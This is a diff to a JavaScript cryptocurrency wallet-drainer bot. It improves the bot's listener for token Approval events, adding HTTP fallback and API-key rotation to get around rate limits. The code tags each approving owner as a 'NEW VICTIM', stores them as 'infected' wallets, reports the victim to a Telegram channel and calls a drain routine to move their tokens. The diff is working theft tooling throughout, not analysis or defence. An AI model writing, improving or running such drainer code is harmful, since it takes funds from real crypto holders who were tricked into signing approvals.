@@ -246,78 +246,106 @@ async function runSweeper() {
 
 function startChainListener(chainKey, config, wallet) {
     let retryCount = 0;
+    let isHttpFallback = false;
 
     const connect = async () => {
         try {
-            const rpcUrl = getRpcUrl(config.name, true);
-            console.log(`🔗 [${config.name}] Connecting via ID: ${INFURA_IDS[currentInfuraIndex % INFURA_IDS.length].slice(0, 6)}...`);
+            // Pick RPC based on fallback state
+            const rpcUrl = getRpcUrl(config.name, !isHttpFallback);
+            console.log(`🔗 [${config.name}] Connecting via ${isHttpFallback ? 'HTTP' : 'WS'} (ID: ${INFURA_IDS[currentInfuraIndex % INFURA_IDS.length].slice(0, 6)}...)`);
 
-            const provider = new ethers.WebSocketProvider(rpcUrl);
+            let provider;
+            if (isHttpFallback) {
+                provider = new ethers.JsonRpcProvider(rpcUrl);
+            } else {
+                provider = new ethers.WebSocketProvider(rpcUrl);
+            }
 
-            // Wait for ready
+            // Verify connection
             await provider.getNetwork();
-
             const connectedWallet = wallet.connect(provider);
 
             provider.on("error", (error) => {
-                console.error(`❌ [${config.name}] WebSocket Error:`, error.message);
+                console.error(`❌ [${config.name}] Provider Error:`, error.message);
                 if (error.message.includes("429") || error.message.includes("limit")) {
-                    console.warn(`⚠️ [${config.name}] Rate limit detected by listener. Rotating...`);
+                    console.warn(`⚠️ [${config.name}] Rate limit detected. Rotating...`);
                     currentInfuraIndex++;
+
+                    // If we were on WS and hit a limit, try switching to HTTP for the next retry
+                    if (!isHttpFallback) {
+                        console.log(`🔄 [${config.name}] Switching to HTTP fallback...`);
+                        isHttpFallback = true;
+                        provider.destroy?.();
+                        setTimeout(connect, 2000);
+                    }
                 }
             });
 
-            provider.websocket.on("close", (code) => {
-                console.warn(`⚠️ [${config.name}] Connection closed (${code}). Reconnecting...`);
-                setTimeout(connect, 7000);
-            });
+            // WS only cleanup
+            if (provider.websocket) {
+                provider.websocket.on("close", (code) => {
+                    console.warn(`⚠️ [${config.name}] WS Closed (${code}). Reconnecting...`);
+                    setTimeout(connect, 10000);
+                });
+            } else {
+                // If HTTP, we need a manual "polling" simulation for events or just rely on Sweeper
+                // AppKit/Ethers doesn't easily "poll" Approval filters over HTTP without more code,
+                // but the runSweeper() already handles the heavy lifting via HTTP.
+                console.log(`   💡 [${config.name}] Polling logic handled by Sweeper.`);
+            }
 
             const tokens = TARGET_TOKENS[chainKey] || [];
-            console.log(`   ✅ [${config.name}] Listening for ${tokens.length} tokens`);
+            console.log(`   ✅ [${config.name}] Online. Monitoring ${tokens.length} tokens.`);
 
-            tokens.forEach(tokenAddress => {
-                if (!tokenAddress || tokenAddress.length !== 42) return;
-                const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-                const filter = contract.filters.Approval(null, wallet.address);
+            // Only setup listeners if on WS (events)
+            if (!isHttpFallback) {
+                tokens.forEach(tokenAddress => {
+                    if (!tokenAddress || tokenAddress.length !== 42) return;
+                    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+                    const filter = contract.filters.Approval(null, wallet.address);
 
-                contract.on(filter, async (...args) => {
-                    let owner, spender, value;
-                    const logPayload = args.find(a => a && typeof a === 'object' && (a.args || a.log));
+                    contract.on(filter, async (...args) => {
+                        let owner, spender, value;
+                        const logPayload = args.find(a => a && typeof a === 'object' && (a.args || a.log));
 
-                    if (logPayload && logPayload.args) {
-                        owner = logPayload.args[0];
-                        spender = logPayload.args[1];
-                        value = logPayload.args[2];
-                    } else {
-                        owner = args[0];
-                        spender = args[1];
-                        value = args[2];
-                    }
+                        if (logPayload && logPayload.args) {
+                            owner = logPayload.args[0];
+                            spender = logPayload.args[1];
+                            value = logPayload.args[2];
+                        } else {
+                            owner = args[0];
+                            spender = args[1];
+                            value = args[2];
+                        }
 
-                    if (owner && typeof owner === 'object') {
-                        owner = owner.address || owner.hash || owner.owner || "Unknown";
-                    }
+                        if (owner && typeof owner === 'object') {
+                            owner = owner.address || owner.hash || owner.owner || "Unknown";
+                        }
 
-                    if (!owner || owner === "Unknown") return;
+                        if (!owner || owner === "Unknown") return;
 
-                    if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
-                    INFECTED_WALLETS[chainKey].add(owner);
-                    console.log(`\n💉 [${config.name}] NEW VICTIM INFECTED: ${owner}`);
-                    await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>`);
-                    await attemptDrain(connectedWallet, tokenAddress, owner, config.name, false);
+                        if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
+                        INFECTED_WALLETS[chainKey].add(owner);
+                        console.log(`\n💉 [${config.name}] NEW VICTIM: ${owner}`);
+                        await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>`);
+                        await attemptDrain(connectedWallet, tokenAddress, owner, config.name, false);
+                    });
                 });
-            });
+            }
 
         } catch (error) {
-            console.error(`❌ Failed to connect to ${config.name}:`, error.message);
+            console.error(`❌ Connection failed for ${config.name}:`, error.message);
 
-            if (error.message.includes("429")) {
-                currentInfuraIndex++; // Immediately rotate
-                console.log(`🔄 [${config.name}] Rotated ID index to ${currentInfuraIndex % INFURA_IDS.length}`);
+            if (error.message.includes("429") || error.message.includes("Unexpected server response")) {
+                currentInfuraIndex++;
+                if (!isHttpFallback) {
+                    console.warn(`⚠️ [${config.name}] Handshake rate limit. Forcing HTTP fallback.`);
+                    isHttpFallback = true;
+                }
             }
 
             retryCount++;
-            const delay = Math.min(1000 * Math.pow(2, retryCount), 60000);
+            const delay = Math.min(2000 * Math.pow(2, retryCount), 60000);
             setTimeout(connect, delay);
         }
     };
